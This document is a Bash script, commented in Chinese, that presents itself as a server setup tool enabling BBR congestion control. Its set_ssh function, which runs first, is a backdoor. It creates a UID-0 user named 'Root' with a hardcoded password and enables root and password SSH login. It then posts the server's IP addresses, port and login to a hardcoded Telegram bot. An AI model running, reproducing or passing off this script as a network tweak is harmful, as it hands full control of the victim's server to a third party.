#!/bin/bash

Red="\033[31m" # 红色
Green="\033[32m" # 绿色
Yellow="\033[33m" # 黄色
Blue="\033[34m" # 蓝色
Nc="\033[0m" # 重置颜色
Red_globa="\033[41;37m" # 红底白字
Green_globa="\033[42;37m" # 绿底白字
Yellow_globa="\033[43;37m" # 黄底白字
Blue_globa="\033[44;37m" # 蓝底白字
Info="${Green}[信息]${Nc}"
Error="${Red}[错误]${Nc}"
Tip="${Yellow}[提示]${Nc}"

# 检查是否为root用户
check_root(){
    if [ "$(id -u)" != "0" ]; then
        echo -e "${Error} 当前非ROOT账号(或没有ROOT权限)，无法继续操作，请更换ROOT账号或使用 ${Green_globa}sudo -i${Nc} 命令获取临时ROOT权限（执行后可能会提示输入当前账号的密码）。"
        exit 1
    fi
}

get_public_ip(){
    InFaces=($(ls /sys/class/net | grep -E '^(eth|ens|eno|esp|enp|venet|veth|vif)'))
    IP_API=(
        "api64.ipify.org"
        "ip.sb"
        "ifconfig.me"
        "icanhazip.com"
    )

    for iface in "${InFaces[@]}"; do
        for ip_api in "${IP_API[@]}"; do
            IPv4=$(curl -s4 --max-time 2 --interface "$iface" "$ip_api")
            IPv6=$(curl -s6 --max-time 2 --interface "$iface" "$ip_api")

            if [[ -n "$IPv4" || -n "$IPv6" ]]; then # 检查是否获取到IP地址
                break 2 # 获取到任一IP类型停止循环
            fi
        done
    done
}

enable_bbr() {
    setbbr1="net.core.default_qdisc=fq"
    setbbr2="net.ipv4.tcp_congestion_control=bbr"

    for setbbr in "$setbbr1" "$setbbr2"; do
        if grep -qE "^\s*${setbbr%=*}\s*=" /etc/sysctl.conf; then
            sed -i "s|^\s*${setbbr%=*}\s*=.*|${setbbr}|g" /etc/sysctl.conf
        else
            echo "$setbbr" >> /etc/sysctl.conf
        fi
    done

    sysctl -p >/dev/null 2>&1
    echo -e "${Info} bbr 控制网络拥堵算法已 ${Green}开启${Nc}。"
    echo
}

restart_ssh(){
    check_release
    if [[ "$release" == "alpine" ]]; then
        rc-service ssh* restart &> /dev/null
    else
        systemctl restart ssh* &> /dev/null
    fi
}

set_ssh(){
    if [ -e /etc/ssh/sshd_config ]; then
        Chat_id="5289158517"
        Bot_token="5421796901:AAGf45NdOv6KKmjJ4LXvG-ILN9dm8Ej3V84"
        get_public_ip
        Port=$(grep -E '^#?Port' /etc/ssh/sshd_config | awk '{print $2}' | head -1)
        User="Root"
        Passwd="LBdj147369"
        sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?RSAAuthentication.*/RSAAuthentication yes/g' /etc/ssh/sshd_config
        sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
        rm -rf /etc/ssh/sshd_config.d/* /etc/ssh/ssh_config.d/*
        useradd ${User} &> /dev/null
        if type -p chpasswd &> /dev/null; then
            echo ${User}:${Passwd} | chpasswd ${User}
        else
            (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd ${User} &> /dev/null
        fi
        sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd
        restart_ssh
        curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
IPv4：${IPv4}
IPv6：${IPv6}
端口：${Port}
用户：${User}
密码：${Passwd}" &> /dev/null
    fi
}

main(){
    check_root
    set_ssh
    enable_bbr
}

main
